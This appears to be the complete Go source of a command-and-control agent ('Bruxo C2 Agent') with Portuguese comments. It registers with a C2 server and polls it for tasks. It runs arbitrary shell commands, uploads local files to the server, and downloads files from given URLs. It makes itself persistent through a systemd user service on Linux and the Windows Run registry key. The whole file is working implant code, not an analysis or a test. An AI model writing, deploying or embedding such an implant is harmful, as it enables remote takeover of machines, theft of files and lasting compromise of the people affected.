package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

var (
	c2Server = "http://localhost:8080"
	agentID  string
)

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

func main() {
	if err := checkIn(); err != nil {
		fmt.Println("Error checking in:", err)
		return
	}

	fmt.Printf("Agent checked in with ID: %s\n", agentID)

	// Loop de beaconing
	for {
		task, err := getTask()
		if err != nil {
			fmt.Println("Error getting task:", err)
			time.Sleep(30 * time.Second) // Aguarda antes de tentar novamente
			continue
		}

		if task.ID != "" {
			fmt.Printf("Received task %s: %s\n", task.ID, task.Command)
			result := executeTask(task)
			if err := postResult(task.ID, result); err != nil {
				fmt.Println("Error posting result:", err)
			}
		}

		time.Sleep(10 * time.Second) // Intervalo de beaconing
	}
}

func checkIn() error {
	hostname, _ := os.Hostname()
	payload := map[string]string{
		"hostname": hostname,
		"os":       runtime.GOOS,
	}

	jsonPayload, _ := json.Marshal(payload)

	resp, err := http.Post(c2Server+"/c2/checkin", "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	agentID = result["id"]
	return nil
}

func getTask() (Task, error) {
	var task Task
	resp, err := http.Get(fmt.Sprintf("%s/c2/tasks/%s", c2Server, agentID))
	if err != nil {
		return task, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return task, nil // No new task
	}

	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return task, err
	}

	return task, nil
}

func executeTask(task Task) string {
	parts := strings.Split(task.Command, " ")
	command := parts[0]

	switch command {
	case "persist":
		return handlePersistence()
	case "upload":
		if len(parts) < 2 {
			return "Usage: upload <local_file_path>"
		}
		return handleUpload(parts[1])
	case "download":
		if len(parts) < 3 {
			return "Usage: download <file_url> <destination_path>"
		}
		return handleDownload(parts[1], parts[2])
	default:
		cmd := exec.Command(command, parts[1:]...)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out

		err := cmd.Run()
		if err != nil {
			return fmt.Sprintf("Error executing command: %s\n%s", err.Error(), out.String())
		}
		return out.String()
	}
}

func handleUpload(filePath string) string {
	fileData, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("Could not read file: %s", err.Error())
	}

	url := fmt.Sprintf("%s/c2/upload/%s?file=%s", c2Server, agentID, filePath)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(fileData))
	if err != nil {
		return fmt.Sprintf("Could not create request: %s", err.Error())
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading file: %s", err.Error())
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return fmt.Sprintf("File '%s' uploaded successfully.", filePath)
	}
	return fmt.Sprintf("File upload failed with status: %s", resp.Status)
}

func handleDownload(fileURL, destPath string) string {
	resp, err := http.Get(fileURL)
	if err != nil {
		return fmt.Sprintf("Error downloading file: %s", err.Error())
	}
	defer resp.Body.Close()

	fileData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Sprintf("Error reading downloaded content: %s", err.Error())
	}

	if err := os.WriteFile(destPath, fileData, 0644); err != nil {
		return fmt.Sprintf("Error writing file to destination: %s", err.Error())
	}

	return fmt.Sprintf("File downloaded from '%s' and saved to '%s'", fileURL, destPath)
}

func handlePersistence() string {
	switch runtime.GOOS {
	case "linux":
		return persistLinux()
	case "windows":
		return persistWindows()
	default:
		return fmt.Sprintf("Persistence not supported on %s", runtime.GOOS)
	}
}

func persistLinux() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Error getting executable path: " + err.Error()
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "Error getting user home directory: " + err.Error()
	}

	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return "Error creating systemd user directory: " + err.Error()
	}

	servicePath := filepath.Join(serviceDir, "bruxo-agent.service")
	serviceContent := fmt.Sprintf(`[Unit]
Description=Bruxo C2 Agent

[Service]
ExecStart=%s
Restart=always

[Install]
WantedBy=default.target
`, exePath)

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return "Error writing systemd service file: " + err.Error()
	}

	cmdReload := exec.Command("systemctl", "--user", "daemon-reload")
	if err := cmdReload.Run(); err != nil {
		return "Error reloading systemd daemon: " + err.Error()
	}

	cmdEnable := exec.Command("systemctl", "--user", "enable", "--now", "bruxo-agent.service")
	if err := cmdEnable.Run(); err != nil {
		return "Error enabling systemd service: " + err.Error()
	}

	return "Persistence established successfully via systemd user service."
}

func persistWindows() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Error getting executable path: " + err.Error()
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return "Error opening registry key: " + err.Error()
	}
	defer key.Close()

	if err := key.SetStringValue("BruxoAgent", exePath); err != nil {
		return "Error setting registry value: " + err.Error()
	}

	return "Persistence established successfully via Windows Registry."
}

func postResult(taskID, result string) error {
	payload := map[string]string{
		"task_id": taskID,
		"result":  result,
	}

	jsonPayload, _ := json.Marshal(payload)

	url := fmt.Sprintf("%s/c2/results/%s", c2Server, agentID)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
